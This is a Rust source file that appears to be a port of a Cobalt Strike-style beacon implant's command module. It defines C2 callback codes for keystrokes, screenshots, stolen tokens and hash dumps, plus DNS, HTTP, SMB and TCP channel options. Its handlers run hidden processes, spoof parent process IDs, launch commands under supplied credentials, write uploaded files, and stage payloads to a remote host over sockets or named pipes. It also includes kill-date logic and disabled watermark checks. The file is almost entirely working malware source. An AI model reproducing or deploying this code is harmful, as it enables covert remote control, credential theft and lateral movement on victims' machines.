//! Command implementations (commands.cpp) + callback/command constants
//! (commands.h).

use crate::callback::{post_error_d, post_error_na, post_error_sd, Callback};
use crate::channel_tcp::channel_winsock_init;
use crate::functions::{disable_wow64, revert_wow64};
use crate::jobs::{cleanup_process, connect_pipe, psh_track};
use crate::parse::{data_alloc, DataP};
use crate::process::execute_program_with_default_ppid;
use crate::settings::setting_int;
use crate::state;
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError};
use windows_sys::Win32::Networking::WinSock::*;
use windows_sys::Win32::System::Environment::{GetCurrentDirectoryA, SetCurrentDirectoryA};
use windows_sys::Win32::System::Pipes::{CreatePipe, DisconnectNamedPipe};
use windows_sys::Win32::Foundation::SYSTEMTIME;
use windows_sys::Win32::System::SystemInformation::GetLocalTime;
use windows_sys::Win32::System::Threading::{
    GetStartupInfoA, WaitForSingleObject, CREATE_NEW_CONSOLE, PROCESS_INFORMATION, STARTUPINFOA,
};
use windows_sys::Win32::UI::WindowsAndMessaging::SW_HIDE;
use windows_sys::Win32::Storage::FileSystem::{FlushFileBuffers, WriteFile};
use windows_sys::Win32::Foundation::HANDLE;

// ---- callback constants (commands.h) ------------------------------------

pub const CALLBACK_OUTPUT: i32 = 0x00;
pub const CALLBACK_KEYSTROKES: i32 = 0x01;
pub const CALLBACK_FILE: i32 = 0x02;
pub const CALLBACK_SCREENSHOT: i32 = 0x03;
pub const CALLBACK_CLOSE: i32 = 0x04;
pub const CALLBACK_READ: i32 = 0x05;
pub const CALLBACK_CONNECT: i32 = 0x06;
pub const CALLBACK_PING: i32 = 0x07;
pub const CALLBACK_FILE_WRITE: i32 = 0x08;
pub const CALLBACK_FILE_CLOSE: i32 = 0x09;
pub const CALLBACK_PIPE_OPEN: i32 = 0x0a;
pub const CALLBACK_PIPE_CLOSE: i32 = 0x0b;
pub const CALLBACK_PIPE_READ: i32 = 0x0c;
pub const CALLBACK_POST_ERROR: i32 = 0x0d;
pub const CALLBACK_PIPE_PING: i32 = 0x0e;
pub const CALLBACK_TOKEN_STOLEN: i32 = 0x0f;
pub const CALLBACK_TOKEN_GETUID: i32 = 0x10;
pub const CALLBACK_PROCESS_LIST: i32 = 0x11;
pub const CALLBACK_POST_REPLAY_ERROR: i32 = 0x12;
pub const CALLBACK_PWD: i32 = 0x13;
pub const CALLBACK_JOBS: i32 = 0x14;
pub const CALLBACK_HASHDUMP: i32 = 0x15;
pub const CALLBACK_PENDING: i32 = 0x16;
pub const CALLBACK_ACCEPT: i32 = 0x17;
pub const CALLBACK_NETVIEW: i32 = 0x18;
pub const CALLBACK_PORTSCAN: i32 = 0x19;
pub const CALLBACK_DEAD: i32 = 0x1a;
pub const CALLBACK_SSH_STATUS: i32 = 0x1b;
pub const CALLBACK_CHUNK_ALLOCATE: i32 = 0x1c;
pub const CALLBACK_CHUNK_SEND: i32 = 0x1d;
pub const CALLBACK_OUTPUT_OEM: i32 = 0x1e;
pub const CALLBACK_ERROR: i32 = 0x1f;
pub const CALLBACK_OUTPUT_UTF8: i32 = 0x20;

// c2 options
pub const POST_DNS: u32 = 0x0;
pub const POST_HTTP: u32 = 0x1;
pub const POST_SMB: u32 = 0x2;
pub const POST_TCP: u32 = 0x3;

pub const MAX_PACKET: usize = 524288;
pub const MAX_PACKET_DNS: usize = 4096;

// read modes
pub const JOB_MODE_BYTE: i16 = 0x0;
pub const JOB_MODE_MESSAGE: i16 = 0x1;

/// Terminate the beacon (die).
pub fn command_die(cb: Callback) {
    state::set_sleep_time(0);
    cb(&[], 0, CALLBACK_DEAD);
}

/// Change the current directory.
pub fn command_cd(buffer: &[u8], length: usize) {
    let mut path = vec![0u8; 1024];
    if length > 1023 {
        return;
    }
    path[..length].copy_from_slice(&buffer[..length]);
    unsafe {
        SetCurrentDirectoryA(path.as_ptr() as *const _);
    }
}

/// Set an environment variable.
pub fn command_setenv(buffer: &[u8], _length: usize) {
    // putenv(buffer): "KEY=VALUE"
    if let Ok(s) = std::str::from_utf8(buffer) {
        if let Some(eq) = s.find('=') {
            std::env::set_var(&s[..eq], &s[eq + 1..]);
        }
    }
}

/// Adjust the sleep time.
pub fn command_sleep(buffer: &[u8], length: usize) {
    // CS-13: don't override a zero sleep time (waiting to exit)
    if state::sleep_time() == 0 {
        return;
    }
    let mut parser = DataP::init(&mut buffer.to_vec());
    state::set_sleep_time(parser.data_int());
    let j = parser.data_int() as u32;
    if j <= 0 || j > 99 {
        state::set_jitter(0);
    } else {
        state::set_jitter(j);
    }
}

/// Run a command without a shell.
pub fn command_execute(buffer: &[u8], length: usize) {
    let mut si: STARTUPINFOA = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    unsafe {
        GetStartupInfoA(&mut si);
        si.dwFlags = 0x00000100 | 0x00000001; // STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
        si.wShowWindow = SW_HIDE as u16;
        si.hStdOutput = std::ptr::null_mut();
        si.hStdError = std::ptr::null_mut();
        si.hStdInput = std::ptr::null_mut();
    }

    if length > 1023 {
        return;
    }
    let mut cbuffer = vec![0u8; 1025];
    cbuffer[..length].copy_from_slice(&buffer[..length]);

    execute_program_with_default_ppid(
        &cbuffer,
        length,
        &mut si as *mut _ as *mut core::ffi::c_void,
        &mut pi as *mut _ as *mut core::ffi::c_void,
        0,
        false,
    );
    cleanup_process(&pi);
}

/// Run under a specific parent PID.
pub fn command_runu(buffer: &[u8], length: usize) {
    let mut local = data_alloc(8192);
    let mut command = vec![0u8; 8192];

    let mut parser = DataP::init(&mut buffer.to_vec());
    let ppid = parser.data_int() as i32;
    let _ = parser.data_string(&mut command, 8192);

    let mut si: STARTUPINFOA = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
    unsafe {
        GetStartupInfoA(&mut si);
        si.dwFlags = 0x00000100 | 0x00000001;
        si.wShowWindow = SW_HIDE as u16;
    }

    let clen = command.iter().position(|&c| c == 0).unwrap_or(command.len());
    crate::process::execute_program_with_ppid(
        &command,
        clen,
        &mut si as *mut _ as *mut core::ffi::c_void,
        &mut pi as *mut _ as *mut core::ffi::c_void,
        0x00000010 /* CREATE_NEW_CONSOLE */,
        false,
        ppid,
    );

    local.cleanup();
    cleanup_process(&pi);
}

/// Quickly/easily convert an ASCII string to wide chars.
pub fn to_wide_char(src: &[u8], dst: &mut [u16], max: usize) -> bool {
    let s = String::from_utf8_lossy(src);
    let mut n = 0usize;
    for ch in s.encode_utf16() {
        if n >= max {
            return false;
        }
        dst[n] = ch;
        n += 1;
    }
    dst[n.min(max.saturating_sub(1))] = 0;
    true
}

/// Domain, user, password, command+args [all wide strings].
pub fn command_runas(buffer: &[u8], length: usize, callback: Callback) {
    let mut local = data_alloc((1024 * 3) + crate::process::MAX_RUNAS_CMD);
    let mut command = vec![0u8; crate::process::MAX_RUNAS_CMD];
    let mut domain = vec![0u8; 1024];
    let mut user = vec![0u8; 1024];
    let mut pass = vec![0u8; 1024];

    let mut parser = DataP::init(&mut buffer.to_vec());
    if parser.data_string(&mut domain, 1024) == 0
        || parser.data_string(&mut user, 1024) == 0
        || parser.data_string(&mut pass, 1024) == 0
        || parser.data_string(&mut command, crate::process::MAX_RUNAS_CMD) == 0
    {
        local.cleanup();
        return;
    }

    // disable the current token
    crate::tokens::token_guard_start();
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
    let _ = crate::process::runas(
        &domain,
        &user,
        &pass,
        &command,
        0,
        &mut pi as *mut _ as *mut core::ffi::c_void,
    );
    crate::tokens::token_guard_stop();

    local.cleanup();
    cleanup_process(&pi);
}

fn execjob_doit(runme: &[u8], flags: u32) {
    let mut si: STARTUPINFOA = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let mut sa: windows_sys::Win32::Security::SECURITY_ATTRIBUTES = unsafe { std::mem::zeroed() };
    sa.nLength = std::mem::size_of::<windows_sys::Win32::Security::SECURITY_ATTRIBUTES>() as u32;
    sa.bInheritHandle = 1;

    let mut newstdout: HANDLE = std::ptr::null_mut();
    let mut read_stdout: HANDLE = std::ptr::null_mut();
    unsafe {
        CreatePipe(&mut read_stdout, &mut newstdout, &sa, 1024 * 1024);
        GetStartupInfoA(&mut si);
        si.dwFlags = 0x00000100 | 0x00000001;
        si.wShowWindow = SW_HIDE as u16;
        si.hStdOutput = newstdout;
        si.hStdError = newstdout;
        si.hStdInput = std::ptr::null_mut();
    }

    let mut runme_buf = runme.to_vec();
    runme_buf.push(0);
    if !execute_program_with_default_ppid(
        &runme_buf,
        runme.len(),
        &mut si as *mut _ as *mut core::ffi::c_void,
        &mut pi as *mut _ as *mut core::ffi::c_void,
        CREATE_NEW_CONSOLE,
        false,
    ) {
        return;
    }

    unsafe {
        WaitForSingleObject(pi.hProcess, 10 * 1000);
    }
    psh_track(&pi, read_stdout as isize, newstdout as isize);
}

/// Run a local OS command, get output, send it back later.
pub fn command_execjob(buffer: &[u8], length: usize) {
    let mut chunks = data_alloc(8192 * 4);
    let mut command = vec![0u8; 8192];
    let mut command_exp = vec![0u8; 8192];
    let mut args = vec![0u8; 8192];
    let mut runme = vec![0u8; 8192];

    let mut parser = DataP::init(&mut buffer.to_vec());
    let _ = parser.data_string(&mut command, 8192);
    let _ = parser.data_string(&mut args, 8192);
    let flags = parser.data_short() as u32;

    // expand env vars in the command only
    let cmd_len = command.iter().position(|&c| c == 0).unwrap_or(command.len());
    crate::filesys::env_expand(&command[..cmd_len], &mut command_exp, 8192);

    // combine command + args
    let exp_len = command_exp.iter().position(|&c| c == 0).unwrap_or(command_exp.len());
    let arg_len = args.iter().position(|&c| c == 0).unwrap_or(args.len());
    runme[..exp_len].copy_from_slice(&command_exp[..exp_len]);
    runme[exp_len..exp_len + arg_len].copy_from_slice(&args[..arg_len]);

    // disable WOW64 if requested
    if (flags & 1) == 1 {
        let mut old_value: *mut core::ffi::c_void = std::ptr::null_mut();
        disable_wow64(&mut old_value);
        execjob_doit(&runme[..exp_len + arg_len], flags);
        revert_wow64(old_value);
    } else {
        execjob_doit(&runme[..exp_len + arg_len], flags);
    }

    chunks.cleanup();
}

/// Upload some content.
pub fn command_upload(buffer: &[u8], length: usize, mode: &[u8]) {
    let mut name = vec![0u8; 1024];
    let mut parser = DataP::init(&mut buffer.to_vec());
    if parser.data_string(&mut name, 1024) == 0 {
        return;
    }
    let name_end = name.iter().position(|&c| c == 0).unwrap_or(name.len());
    let name_str = String::from_utf8_lossy(&name[..name_end]);
    let mode_str = String::from_utf8_lossy(mode);

    let data = parser.data_buffer();
    match std::fs::OpenOptions::new()
        .write(true)
        .create(true)
        .append(mode_str == "ab")
        .truncate(mode_str == "wb")
        .open(name_str.as_ref())
    {
        Ok(mut f) => {
            use std::io::Write;
            let _ = f.write_all(data);
        }
        Err(_) => {
            post_error_d(0x08, unsafe { GetLastError() } as i32);
        }
    }
}

/// Return the current working directory.
pub fn command_pwd(callback: Callback) {
    let mut result = vec![0u8; 2048];
    let size = unsafe { GetCurrentDirectoryA(2048, result.as_mut_ptr() as *mut _) };
    if size > 0 {
        callback(&result[..size as usize], size as i32, CALLBACK_PWD);
    }
}

pub fn command_pause(buffer: &[u8], length: usize) {
    let mut parser = DataP::init(&mut buffer.to_vec());
    let time = parser.data_int();
    std::thread::sleep(std::time::Duration::from_millis(time as u64));
}

/// Connect to a host:port.
pub fn wsconnect(targetip: &[u8], port: i32) -> isize {
    unsafe {
        let my_socket = socket(AF_INET as i32, SOCK_STREAM, 0);
        if my_socket == INVALID_SOCKET as _ {
            return -1;
        }
        let target = gethostbyname(cstr(targetip).as_ptr() as *const _);
        if target.is_null() {
            closesocket(my_socket);
            return -1;
        }
        let mut sock: SOCKADDR_IN = std::mem::zeroed();
        let addr = *(*target).h_addr_list.offset(0) as *const u8;
        std::ptr::copy_nonoverlapping(
            addr,
            &mut sock.sin_addr.S_un.S_addr as *mut u32 as *mut u8,
            (*target).h_length as usize,
        );
        sock.sin_family = AF_INET as u16;
        sock.sin_port = (port as u16).to_be();
        if connect(my_socket, &sock as *const SOCKADDR_IN as *const _, std::mem::size_of::<SOCKADDR_IN>() as i32) != 0 {
            closesocket(my_socket);
            return -1;
        }
        my_socket as isize
    }
}

pub fn command_stage_payload(buffer: &[u8], length: usize) {
    let mut parser = DataP::init(buffer);
    let host = parser.data_string_asciiz().map(|s| s.to_vec()).unwrap_or_default();
    let port = parser.data_int() as i32;
    let data = parser.data_buffer().to_vec();
    let len = parser.data_length();

    channel_winsock_init();

    let stopat = unsafe { windows_sys::Win32::System::SystemInformation::GetTickCount() } + 60000;
    let mut mysock: isize = -1;
    unsafe {
        while windows_sys::Win32::System::SystemInformation::GetTickCount() < stopat {
            mysock = wsconnect(&host, port);
            if mysock == -1 {
                std::thread::sleep(std::time::Duration::from_millis(1000));
            } else {
                send(mysock as SOCKET, data.as_ptr() as *const _, len as i32, 0);
                break;
            }
        }
    }
    if mysock == -1 {
        post_error_na(0x46);
    }
    std::thread::sleep(std::time::Duration::from_millis(1000));
    unsafe {
        closesocket(mysock as SOCKET);
    }
}

pub fn command_stage_payload_smb(buffer: &[u8], length: usize) {
    let mut parser = DataP::init(&mut buffer.to_vec());
    let mut pipe = vec![0u8; 128];
    let _ = parser.data_string(&mut pipe, 128);
    let data = parser.data_buffer();
    let len = parser.data_length();

    let mut wrote: u32 = 0;
    let stopat = unsafe { windows_sys::Win32::System::SystemInformation::GetTickCount() } + 60000;

    for _ in 0..10 {
        let mut handle: HANDLE = std::ptr::null_mut();
        let mut handle_isize = handle as isize;
        if connect_pipe(&pipe, &mut handle_isize) {
            let handle = handle_isize as HANDLE;
            unsafe {
                let mut temp: u32 = 0;
                WriteFile(handle, &(len as u32).to_le_bytes() as *const _ as *const _, 4, &mut temp, std::ptr::null_mut());
                while wrote < len as u32 {
                    let chunk = (len as u32 - wrote).min(8192);
                    if WriteFile(handle, data[wrote as usize..(wrote + chunk) as usize].as_ptr() as *const _, chunk, &mut temp, std::ptr::null_mut()) != 0 {
                        wrote += temp;
                    } else {
                        break;
                    }
                }
                FlushFileBuffers(handle);
                DisconnectNamedPipe(handle);
                CloseHandle(handle);
            }
            std::thread::sleep(std::time::Duration::from_millis(1000));
            return;
        } else if unsafe { GetLastError() } == 53 {
            break;
        } else if unsafe { windows_sys::Win32::System::SystemInformation::GetTickCount() } >= stopat {
            break;
        } else {
            std::thread::sleep(std::time::Duration::from_millis(1000));
        }
    }

    post_error_sd(0x32, &pipe, unsafe { GetLastError() } as i32);
}

/// TRUE - exit, FALSE - continue as normal.
pub fn check_kill_date() -> bool {
    // do nothing if there is no killdate!
    if setting_int(crate::beacon::SETTING_KILLDATE) == 0 {
        return false;
    }
    let mut meow: SYSTEMTIME = unsafe { std::mem::zeroed() };
    unsafe {
        GetLocalTime(&mut meow);
    }
    let today = meow.wYear as u32 * 10000 + meow.wMonth as u32 * 100 + meow.wDay as u32;
    today >= setting_int(crate::beacon::SETTING_KILLDATE)
}

/// Watermark validation (disabled in this build, like the C++ comments).
pub fn bad_watermark() -> bool {
    true
}

/// Watermark hash validation (disabled in this build).
pub fn bad_watermark_hash() -> bool {
    true
}

fn cstr(s: &[u8]) -> Vec<u8> {
    let mut v = s.to_vec();
    if !v.ends_with(&[0]) {
        v.push(0);
    }
    v
}
